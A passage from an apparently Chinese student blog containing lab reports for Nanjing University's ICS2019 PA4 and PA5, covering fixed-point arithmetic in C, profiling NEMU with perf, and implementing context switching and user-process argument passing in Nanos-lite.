data-target="#collapse-cv5c4ulluwpkzu"></i><span>C</span><div class="collapse show" id="collapse-cv5c4ulluwpkzu"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> FLOAT;FLOAT <span class="hljs-title function_">f2F</span><span class="hljs-params">(<span class="hljs-type">float</span> a)</span> {  <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">float_</span> {</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>      <span class="hljs-type">uint32_t</span> m : <span class="hljs-number">23</span>;      <span class="hljs-type">uint32_t</span> e : <span class="hljs-number">8</span>;      <span class="hljs-type">uint32_t</span> signal : <span class="hljs-number">1</span>;    };    <span class="hljs-type">uint32_t</span> value;  };  <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">float_</span> <span class="hljs-title">f</span>;</span>  f.value = *((<span class="hljs-type">uint32_t</span>*)(<span class="hljs-type">void</span>*)&amp;a);  <span class="hljs-type">int</span> e = f.e - <span class="hljs-number">127</span>;  FLOAT result;  <span class="hljs-keyword">if</span> (e &lt;= <span class="hljs-number">7</span>) {    result = (f.m | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>)) &gt;&gt; <span class="hljs-number">7</span> - e;  }  <span class="hljs-keyword">else</span> {    result = (f.m | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>)) &lt;&lt; (e - <span class="hljs-number">7</span>);  }  <span class="hljs-keyword">return</span> f.signal == <span class="hljs-number">0</span> ? result : (result|(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));}</code></pre></div></div><h3 id="浮点乘除">浮点乘除</h3><h4 id="乘法">乘法</h4><p>整数部分和小数部分分别相乘，进位。关于舍入处理，这里是采用的“0舍1入”的模式。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-duofjhlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-duofjhlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function">FLOAT <span class="hljs-title">F_mul_F</span><span class="hljs-params">(FLOAT a, FLOAT b)</span> </span>{  <span class="hljs-type">int</span> sign = (a ^ b) &gt;&gt; <span class="hljs-number">31</span>;  <span class="hljs-comment">// 计算符号位</span>  <span class="hljs-comment">// 将a和b的符号位清零</span>  a = a &amp; <span class="hljs-number">0x7FFFFFFF</span>;  b = b &amp; <span class="hljs-number">0x7FFFFFFF</span>;  <span class="hljs-comment">// 执行乘法运算</span>  <span class="hljs-type">int</span> product_hi = (a &gt;&gt; <span class="hljs-number">16</span>) * (b &gt;&gt; <span class="hljs-number">16</span>);  <span class="hljs-comment">// 高16位的乘积</span>  <span class="hljs-type">int</span> product_lo = (a &amp; <span class="hljs-number">0xFFFF</span>) * (b &amp; <span class="hljs-number">0xFFFF</span>);  <span class="hljs-comment">// 低16位的乘积</span>  <span class="hljs-comment">// 处理溢出</span>  <span class="hljs-type">int</span> carry = product_lo &gt;&gt; <span class="hljs-number">16</span>;  <span class="hljs-comment">// 检查低16位乘积是否产生进位</span>  product_hi += carry;  <span class="hljs-comment">// 加上进位</span>  <span class="hljs-comment">// 舍入处理</span>  <span class="hljs-type">int</span> rounding = <span class="hljs-number">0x8000</span>;  <span class="hljs-comment">// 用于舍入的值</span>  <span class="hljs-type">int</span> result = (product_hi &lt;&lt; <span class="hljs-number">16</span>) + ((product_lo + rounding) &gt;&gt; <span class="hljs-number">16</span>);  <span class="hljs-comment">// 恢复符号位</span>  result = (result ^ sign) - sign;  <span class="hljs-keyword">return</span> result;}</code></pre></div></div><h4 id="除法">除法</h4><p>和乘法类似，也是采用列竖式的思路。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5lgaoxlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-5lgaoxlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function">FLOAT <span class="hljs-title">F_div_F</span><span class="hljs-params">(FLOAT a, FLOAT b)</span> </span>{  FLOAT result = <span class="hljs-built_in">Fabs</span>(a) / <span class="hljs-built_in">Fabs</span>(b);  FLOAT m = <span class="hljs-built_in">Fabs</span>(a);  FLOAT n = <span class="hljs-built_in">Fabs</span>(b);  m = m % n;    <span class="hljs-comment">//竖式除法</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {    m &lt;&lt;= <span class="hljs-number">1</span>;    result &lt;&lt;= <span class="hljs-number">1</span>;    <span class="hljs-keyword">if</span> (m &gt;= n) {      m -= n;      result++;    }  }  <span class="hljs-comment">//恢复符号位</span>  <span class="hljs-keyword">if</span> (((a ^ b) &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0x80000000</span>) {    result = -result;  }  <span class="hljs-keyword">return</span> result;}</code></pre></div></div><h3 id="float和int转换">FLOAT和int转换</h3><p>直接取整数部分即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g3kntmlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-g3kntmlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">F2int</span><span class="hljs-params">(FLOAT a)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> ((a &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)  {    <span class="hljs-keyword">return</span> a &gt;&gt; <span class="hljs-number">16</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">return</span> -((-a) &gt;&gt; <span class="hljs-number">16</span>);  }}<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">int2F</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">if</span> ((a &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>)  {    <span class="hljs-keyword">return</span> a &lt;&lt; <span class="hljs-number">16</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">return</span> -((-a) &lt;&lt; <span class="hljs-number">16</span>);  }}</code></pre></div></div><h3 id="float和int乘除">FLOAT和int乘除</h3><p>直观的思路是都把他们转成FLOAT类型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-10liyllluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-10liyllluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">F_mul_int</span><span class="hljs-params">(FLOAT a, <span class="hljs-type">int</span> b)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// assert(0);</span>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">F_mul_F</span>(a, <span class="hljs-built_in">int2F</span>(b));}<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> FLOAT <span class="hljs-title">F_div_int</span><span class="hljs-params">(FLOAT a, <span class="hljs-type">int</span> b)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// assert(0);</span>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">F_div_F</span>(a, <span class="hljs-built_in">int2F</span>(b));}</code></pre></div></div><p>成功运行战斗场景。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210316468177_507_20230601235927896331_956_image-20230601111624447.png" alt="image-20230601111624447"><figcaption aria-hidden="true">image-20230601111624447</figcaption></figure><h2 id="通往高速的次元">通往高速的次元</h2><p>如果用VMware的话需要开这两个选项:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210320091905_497_20230601235930759689_235_image-20230601112713746.png" alt="image-20230601112713746"><figcaption aria-hidden="true">image-20230601112713746</figcaption></figure><p>报这种错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iriu0olluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-iriu0olluwpkzu"><pre><code class="hljs shell">Error:You may not have permission to collect stats.Consider tweaking /proc/sys/kernel/perf_event_paranoid: -1 - Not paranoid at all  0 - Disallow raw tracepoint access for unpriv  1 - Disallow cpu events for unpriv  2 - Disallow kernel profiling for unpriv</code></pre></div></div><p>可以临时提权:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7uxz4nlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-7uxz4nlluwpkzu"><pre><code class="hljs shell">sudo sh -c "echo -1 &gt; /proc/sys/kernel/perf_event_paranoid"</code></pre></div></div><p>运行: </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xixc2jlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-xixc2jlluwpkzu"><pre><code class="hljs shell">perf record nemu/build/x86-nemu nanos-lite/build/nanos-lite-x86-nemu.bin</code></pre></div></div><p></p><p>我感觉也不太好看出什么。。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210321017793_737_20230601235934898992_647_image-20230601113933501.png" alt="image-20230601113933501"><figcaption aria-hidden="true">image-20230601113933501</figcaption></figure><p>好吧，下一章第一句话就是</p><blockquote><p>相信你也已经在NEMU中运行过<code>microbench</code>,发现NEMU的性能连真机的1%都不到.使用<code>perf</code>也没有发现能突破性能瓶颈的地方.</p></blockquote><h3 id="性能瓶颈的来源">性能瓶颈的来源</h3><p>略</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA4</title>
    <link href="/posts/44109/"/>
    <url>/posts/44109/</url>
    
    <content type="html"><![CDATA[<h1 id="pa4实验报告">PA4实验报告</h1><p>2013599 田佳业</p><h2 id="阶段一">阶段一</h2><h3 id="实现上下文切换">实现上下文切换</h3><ul><li>CTE的<code>_kcontext()</code>函数</li></ul><p>已经做了3个PA了，对“你需要“这样的字眼已经很敏感了.根据讲义:</p><blockquote><p>在<code>kstack</code>的底部创建一个以<code>entry</code>为返回地址的上下文结构(目前你可以先忽略<code>arg</code>参数),然后返回这一结构的指针.Nanos-lite会调用<code>_kcontext()</code>来创建上下文,并把返回的指针记录到PCB的<code>cp</code>中.</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nl1xazlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-nl1xazlluwpkzu"><pre><code class="hljs C++">_Context *_kcontext(_Area stack, <span class="hljs-built_in">void</span> (*entry)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg) {_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context));new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;eflags=<span class="hljs-number">0x2</span>;new_p-&gt;cs=<span class="hljs-number">8</span>;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><ul><li>Nanos-lite的<code>schedule()</code>函数</li></ul><p>如指导书所述</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-omz0inlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-omz0inlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-comment">// always select pcb[0] as the new process</span>  current = &amp;pcb[<span class="hljs-number">0</span>];  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><ul><li>在Nanos-lite收到<code>_EVENT_YIELD</code>事件后,调用<code>schedule()</code>并返回新的上下文</li></ul><p><code>nanos-lite/src/irq.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ewd1ailluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ewd1ailluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> _EVENT_YIELD:  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"_EVENT_YIELD recognized"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">schedule</span>(c);</code></pre></div></div><ul><li>修改CTE中<code>__am_asm_trap()</code>的实现,使得从<code>__am_irq_handle()</code>返回后,先将栈顶指针切换到新进程的上下文结构, 然后才恢复上下文,从而完成上下文切换的本质操作</li></ul><p>这一部分是最核心的。</p><p><code>nexus-am/am/src/x86/nemu/trap.S</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1erfcylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-1erfcylluwpkzu"><pre><code class="hljs C++">__am_asm_trap:  pushal  pushl $<span class="hljs-number">0</span>  pushl %esp  call __am_irq_handle  addl $<span class="hljs-number">4</span>, %esp  movl %eax,%esp  addl $<span class="hljs-number">4</span>, %esp  popal  addl $<span class="hljs-number">4</span>, %esp  iret</code></pre></div></div><p>加的是<code>movl %eax,%esp</code>。为什么呢？<code>__am_irq_handle</code>在<code>cte.c</code>中返回的正是<code>_Context</code>结构体的指针，保存在<code>eax</code>寄存器中。原来的时候我们直接跳过这个返回值，恢复中断调用前的上下文。现在我们将栈顶指针指到这个上下文地址，我们后面就可以继续<code>pop</code>新的上下文信息，从而实现乾坤挪移。</p><p>另外这样之后<code>movl %eax,%esp</code>前面那句其实也并不起什么作用了。原来的目的是跳过压栈的<code>esp</code>，现在<code>move</code>指令既然都能直接跳转到另外一个进程的<code>_Context</code>结构体的位置了(虽然也有可能还是自身)，减不减已经无所谓了。</p><p>最后进行测试:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oe0nzhlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-oe0nzhlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">0</span>], hello_fun);  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-comment">// char filename[] = "/bin/init";</span>  <span class="hljs-comment">// // load program here</span>  <span class="hljs-comment">// naive_uload(NULL, filename);</span>}</code></pre></div></div><p>注意按照指导书，我们就不需要使用原来的<code>naive_uload()</code>了。<code>context_kload</code>会调用CTE的<code>kcontext()</code>来创建一个上下文。调用<code>switch_boot_pcb()</code>则是为了初始化<code>current</code>指针.</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205703143955_661_20230601235455853128_651_image-20230524103308566.png" alt="image-20230524103308566"><figcaption aria-hidden="true">image-20230524103308566</figcaption></figure><h3 id="实现上下文切换2">实现上下文切换(2)</h3><ul><li>修改CTE的<code>_kcontext()</code>函数,使其支持参数<code>arg</code>的传递</li></ul><p>这个地方就涉及到x86的函数调用约定了。讲义中提到“mips32和riscv32的调用约定”需要查阅相应的ABI手册，默认我们知道x86的调用约定(捂脸)。借此问题也回顾模拟了PA3中中断调用的过程。感谢某舍友的帮助，非常有耐心的让我把模糊的细节弄清楚了。详细见必答题部分。</p><p>现在增加了参数，就不再是这样了。因此原来的</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c2klezlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-c2klezlluwpkzu"><pre><code class="hljs C++">_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context));</code></pre></div></div><p>现在还要多减一些，因为end不再紧跟context了，而是依次多了返回值和函数参数。</p><p>当然我们还要把参数放到正确的位置。显然这个位置是<code>(stack.end-4，stack.end]</code>，按照函数调用约定。距离上下文结构体(切换的栈帧底部）需要留出返回地址所在的4字节位置。</p><p>原来这个函数是没有<code>arg</code>参数的，现在我们需要手动加上。参数所指向的地址(4字节)。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6ukcd8lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-6ukcd8lluwpkzu"><pre><code class="hljs C++">_Context *_kcontext(_Area stack, <span class="hljs-built_in">void</span> (*entry)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg) {_Context *new_p=(_Context*)(stack.end-<span class="hljs-built_in">sizeof</span>(_Context)<span class="hljs-number">-8</span>);  <span class="hljs-type">void</span> ** temp=(<span class="hljs-type">void</span>**)(stack.end<span class="hljs-number">-4</span>);  *temp=arg;new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;eflags=<span class="hljs-number">0x2</span>;new_p-&gt;cs=<span class="hljs-number">8</span>;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>根据上面的解释为什么减8也比较清楚了，还是需要注意<code>arg</code>是个指针，不管它的内容具体是多少都是占4字节。</p><ul><li>修改<code>hello_fun()</code>函数, 使其输出参数.你可以自行约定参数<code>arg</code>的类型, 包括整数, 字符, 字符串,指针等皆可, 然后按照你的约定来解析<code>arg</code>.</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k7pub4lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-k7pub4lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hello_fun</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><span class="hljs-function"></span>{  <span class="hljs-type">int</span> j = <span class="hljs-number">1</span>;  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)  {    <span class="hljs-comment">// Log("Hello World from Nanos-lite for the %dth time!", j);</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%x"</span>,arg);    j++;    _yield();  }}</code></pre></div></div><ul><li>通过<code>_kcontext()</code>创建第二个以<code>hello_fun()</code>为入口的内核线程,并传递不同的参数</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ysl0e6lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ysl0e6lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">0</span>], hello_fun,<span class="hljs-number">1</span>);  <span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">1</span>], hello_fun,<span class="hljs-number">2</span>);  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);}</code></pre></div></div><ul><li>修改Nanos-lite的<code>schedule()</code>函数,使其轮流返回两个上下文</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iesd0elluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-iesd0elluwpkzu"><pre><code class="hljs C++"><span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  current = ((current == &amp;pcb[<span class="hljs-number">0</span>]) ? &amp;pcb[<span class="hljs-number">1</span>] : &amp;pcb[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205704516608_486_20230601235457992775_260_image-20230529100302757.png" alt="image-20230529100302757"><figcaption aria-hidden="true">image-20230529100302757</figcaption></figure><h3 id="实现多道程序系统">实现多道程序系统</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-32txa3lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-32txa3lluwpkzu"><pre><code class="hljs C++">_Context *_ucontext(_AddressSpace *as, _Area ustack, _Area kstack, <span class="hljs-type">void</span> *entry, <span class="hljs-type">void</span> *args) {_Context *new_p=(_Context*)(ustack.end<span class="hljs-number">-16</span>-<span class="hljs-built_in">sizeof</span>(_Context));new_p-&gt;eip=(<span class="hljs-type">uintptr_t</span>)entry;new_p-&gt;cs=<span class="hljs-number">8</span>;new_p-&gt;eflags=<span class="hljs-number">0x00000202</span>;new_p-&gt;as=as;<span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>为什么减16呢？同样的道理，讲义中提到:</p><blockquote><p>操作系统在加载用户进程的时候,还需要负责把<code>argc/argv/envp</code>以及相应的字符串放在用户栈中,并把它们的存放方式和位置作为和用户进程的约定之一,这样用户进程在<code>_start</code>中就可以访问它们了.</p></blockquote><p><code>argc/argv/envp</code>加上返回地址，就是4个4字节的指针，按照调用约定放到栈底。不过这个是在讲义后面提到的，也是阅读了这一部分才明白原理。</p><p>形象点说就是这样:<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205705617321_438_20230601235500203470_105_image-20230529104434579.png" alt="image-20230529104434579" width="67%" height="67%"></p><p>图来自于袁老师《计算机系统基础》课本第七章</p><p>还ics2021讲义里面是有这个图的，2019就没有，可能也是因为很多外校学生做实验的时候不知道这事(捂脸)</p><p>至于讲义中</p><blockquote><p>需要在<code>serial_write()</code>, <code>events_read()</code>和<code>fb_write()</code>的开头调用<code>_yield()</code>,来模拟设备访问缓慢的情况. 添加之后, 访问设备时就要进行上下文切换,从而实现多道程序系统的功能.</p></blockquote><p>并不是完成这个任务所必须的，只是为了更符合“实际情况”。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uidplhlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-uidplhlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">context_kload</span>(&amp;pcb[<span class="hljs-number">1</span>], hello_fun,<span class="hljs-number">2</span>);<span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">0</span>], <span class="hljs-string">"/bin/pal"</span>);</code></pre></div></div><p>注意至少得有一个内核进程。一开始我写成了这样:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-09bmsdlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-09bmsdlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">0</span>], <span class="hljs-string">"/bin/hello"</span>);<span class="hljs-built_in">context_uload</span>(&amp;pcb[<span class="hljs-number">1</span>], <span class="hljs-string">"/bin/pal"</span>);</code></pre></div></div><p>内核便会不断的重启。</p><p>读到后面发现这就是讲义中的<code>一山不能藏二虎?</code>问题。</p><p>解答:编译Navy-apps中的程序时, 我们都把它们链接到0x83000000的内存位置,如果我们正在运行仙剑奇侠传, 同时也想运行hello程序,它们的内容就会被相互覆盖。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205706936987_880_20230601235504869760_814_image-20230529100930844.png" alt="image-20230529100930844"><figcaption aria-hidden="true">image-20230529100930844</figcaption></figure><h3 id="给用户进程传递参数">给用户进程传递参数</h3><p>这一部分耗费的时间大概几乎是其他所有部分的总和(捂脸)，但是做完所有实验还是没有解决这个问题。</p><p>这一部分讲义就讲的和实际不一致。</p><blockquote><p>根据这一约定, 你还需要修改Navy-apps中<code>_start</code>的代码,在其调用<code>call_main()</code>之前把它的参数设置成<code>argc</code>的地址.然后修改<code>navy-apps/libs/libc/src/plaform/crt0.c</code>中<code>call_main()</code>的代码,让它解析出真正的<code>argc/argv/envp</code>, 并调用<code>main()</code>.这样以后, 用户进程就可以接收到属于它的参数了.</p></blockquote><p>Navy-apps中根本就没有<code>_start</code>函数，也没有什么<code>call_main</code>。但是<code>call_main</code>应当是指的<code>crt_0</code>中这个部分:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dbjm2illuwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-dbjm2illuwpkzu"><pre><code class="hljs C++"><span class="hljs-type">void</span> _start(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[], <span class="hljs-type">char</span> *envp[]) {  <span class="hljs-type">char</span> *env[] = {<span class="hljs-literal">NULL</span>};  environ = env;  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argc:%d\n"</span>,argc);  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){    <span class="hljs-type">char</span> *str=(<span class="hljs-type">char</span>**)(argv[i]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"argv[%d]:%s\n"</span>,i,str);  }  <span class="hljs-built_in">exit</span>(<span class="hljs-built_in">main</span>(argc, argv, env));  <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);}</code></pre></div></div><p>正常的想法应该是这样，按照函数调用约定把字符数组首地址放到正确的位置:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sjm70glluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-sjm70glluwpkzu"><pre><code class="hljs C++">  _Context *new_p = (_Context *)(ustack.end - <span class="hljs-number">16</span> - <span class="hljs-built_in">sizeof</span>(_Context));  <span class="hljs-type">uintptr_t</span> pos = ustack.end - <span class="hljs-number">8</span>;  <span class="hljs-type">void</span> **argv_temp = (<span class="hljs-type">void</span> **)(pos);  *argv_temp = (<span class="hljs-type">void</span> *)(argv);  <span class="hljs-type">void</span> **argc_temp = (<span class="hljs-type">void</span> **)(ustack.end - <span class="hljs-number">12</span>);  *argc_temp = (<span class="hljs-type">void</span> *)(argc);  <span class="hljs-comment">// correct</span>  <span class="hljs-comment">// char* first_str=argv[0];</span>  <span class="hljs-comment">// printf("%s\n",first_str);</span>  <span class="hljs-type">char</span> *first_str = ((<span class="hljs-type">char</span> **)(*argv_temp))[<span class="hljs-number">0</span>];  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, first_str);  new_p-&gt;eip = (<span class="hljs-type">uintptr_t</span>)entry;  new_p-&gt;cs = <span class="hljs-number">8</span>;  new_p-&gt;eflags = <span class="hljs-number">0x00000202</span>;  new_p-&gt;esp = (<span class="hljs-type">uintptr_t</span>)(&amp;new_p-&gt;irq);  new_p-&gt;as = as;  <span class="hljs-keyword">return</span> new_p;}</code></pre></div></div><p>但是这样<code>argc</code>没问题，<code>argv</code>却无法正常读取。和其他做2019的同学交流得知他们这样做是没有问题的。</p><p>甚至后面尝试了直接在栈上吧字符串数组放进去，当然虽然指导书是这么说的，但常量字符串应当在堆区，显然也是有些荒谬的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-td8qgdlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-td8qgdlluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">int</span> space_count=<span class="hljs-number">0</span>;<span class="hljs-keyword">if</span>(argv){  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;argc;i++){    space_count+=(<span class="hljs-built_in">strlen</span>(argv[i])+<span class="hljs-number">1</span>);  }}space_count+=argc;space_count+=<span class="hljs-number">4</span>; <span class="hljs-comment">//return address,argc,argv,envp</span>space_count*=<span class="hljs-number">4</span>; <span class="hljs-comment">//4 bytes for each</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"space_count:%d\n"</span>,space_count);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"end of stack addr:%x\n"</span>,ustack.end);_Context *new_p=(_Context*)(ustack.end-space_count-<span class="hljs-built_in">sizeof</span>(_Context));<span class="hljs-type">void</span>** argc_stack=(<span class="hljs-type">void</span>**)(ustack.end-space_count+<span class="hljs-number">4</span>);*argc_stack=(<span class="hljs-type">void</span>*)(argc);<span class="hljs-comment">// printf("argc:%d\n",(int)(*argc_stack));</span><span class="hljs-comment">//ignore the envp</span><span class="hljs-comment">// the pos to store strings</span><span class="hljs-type">uintptr_t</span> pos=ustack.end-space_count+<span class="hljs-number">16</span>+argc*<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>*);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"string storeing start addr:%x\n"</span>,pos);<span class="hljs-type">char</span>* argv_strs[argc];<span class="hljs-type">uintptr_t</span> argv_stack_addr=ustack.end-space_count+<span class="hljs-number">8</span>;<span class="hljs-type">void</span>** argv_stack=(<span 